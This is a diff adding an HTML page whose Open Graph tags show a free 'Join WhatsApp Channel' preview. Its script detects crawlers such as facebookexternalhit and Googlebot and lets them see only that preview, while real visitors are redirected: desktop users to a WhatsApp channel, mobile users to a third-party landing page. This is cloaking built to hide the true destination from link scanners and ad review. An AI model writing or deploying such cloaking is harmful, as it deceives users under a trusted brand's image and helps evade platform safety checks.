@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    
+    <!-- OG Tags (Ab ye confirm scan honge) -->
+    <meta property="og:title" content="Join WhatsApp Channel Free">
+    <meta property="og:description" content="Click here to join the community for free updates!">
+    <meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/y7/r/Ve243p_1z3D.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    
+    <script>
+        (function() {
+            var whatsappChannel = "https://whatsapp.com/channel/0029Vaojly35q08aXbxyqy22";
+            var mobileLandingPage = "https://industrious-azalea-11v65rg.mystrikingly.com/"; 
+
+            var ua = navigator.userAgent;
+            
+            // Bot Check
+            var isBot = /facebookexternalhit|Facebot|Googlebot|AdsBot|Bot|Crawler|Spider/i.test(ua);
+            
+            // Agar Bot hai, toh redirect mat karo (taaki image load ho jaye)
+            if (isBot) {
+                return;
+            }
+
+            // User redirect logic (Sirf real users ke liye)
+            var hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+            var isSmallScreen = (window.innerWidth < 700);
+
+            if (!hasTouch || !isSmallScreen) {
+                window.location.replace(whatsappChannel);
+            } else {
+                window.location.replace(mobileLandingPage);
+            }
+        })();
+    </script>
+    
+    <title> </title>
+</head>
+<body>
+</body>
+</html>
